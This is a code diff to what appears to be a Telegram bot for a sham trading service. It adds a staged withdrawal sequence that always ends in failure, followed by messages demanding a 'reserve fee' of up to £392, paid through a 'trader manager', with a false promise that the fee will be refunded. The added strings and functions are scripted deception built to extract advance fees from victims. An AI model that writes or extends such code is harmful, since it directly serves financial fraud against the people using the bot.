@@ -244,6 +244,73 @@ def confirm_withdraw_text(amount: int, method: str, destination: str) -> str:
     )
 
 
+# --- Withdrawal "processing" sequence (shown after the user confirms) -------
+
+# First message; then edited step-by-step (5s apart) through the stages below.
+WITHDRAW_REQUEST_RECEIVED = "📥 Withdrawal Request Received"
+
+WITHDRAW_STATUS_STEPS = [
+    "🔐 Verifying Withdrawal Details",
+    "⚙️ Preparing Assets",
+    "🔄 Processing Transfer",
+    "🌐 Broadcasting Transaction",
+    "⛔️ Withdrawal Failed",
+]
+
+# Reserve-fee wording per plan, shown on the suspension image caption.
+WITHDRAW_FEE: dict[int, str] = {
+    80: "7% (£174)",
+    150: "4,5% (£224)",
+    1000: "2,5% (£392)",
+}
+
+# Suspension image per plan (extension-less JPEGs).
+WITHDRAW_COMMISSION_IMAGE: dict[int, str] = {
+    80: "assets/comissions/comission80",
+    150: "assets/comissions/comission150",
+    1000: "assets/comissions/comission1000",
+}
+
+
+def trade_history_text(amount: int) -> str:
+    """The trade history block for a plan (same as the History screen shows)."""
+    return TRADE_HISTORY.get(amount, TRADE_HISTORY[80])
+
+
+def withdraw_blocked_text(amount: int) -> str:
+    """Shown when the user taps Withdraw again after the transaction is on hold."""
+    fee = WITHDRAW_FEE.get(amount, WITHDRAW_FEE[1000])
+    return (
+        "<b>❌ Withdrawal suspended</b>\n\n"
+        "A new withdrawal request cannot be made while the current transaction "
+        "is on hold.\n\n"
+        "<b>Reason:</b> technical delay in liquidity routing. Fund reservation "
+        f"through a market maker is required. Pay the service fee of {fee} "
+        "through your trader manager.\n\n"
+        "Once payment is confirmed, the transaction will be completed and you "
+        "will be able to request withdrawals as normal."
+    )
+
+
+def withdraw_suspended_text(amount: int) -> str:
+    """Caption for the reserve-fee image sent after the withdrawal 'fails'."""
+    fee = WITHDRAW_FEE.get(amount, WITHDRAW_FEE[1000])
+    return (
+        "<b>❌ Withdrawal suspended</b>\n\n"
+        "<b>❔Reason:</b> technical delay in liquidity routing. "
+        "To complete the transaction, an additional market maker is being engaged.\n\n"
+        "<b>What to do:</b>\n"
+        f"Pay the reserve fee — {fee}.\n\n"
+        "<b>❗️Important:</b>\n"
+        "Payment must be made exclusively by the account holder — through your "
+        "trader manager (the same one through whom you purchased access to the bot). "
+        "This is necessary to ensure correct verification of deposit and "
+        "withdrawal addresses.\n\n"
+        "<b>After payment:</b>\n"
+        "The fee will be fully refunded together with the withdrawal amount."
+    )
+
+
 async def _render_main_menu(message: Message, repo: Repo):
     user = await repo.user.get_user_by_id(message.from_user.id)  # type: ignore
     account_id = user.account_id if user and user.account_id else "—"
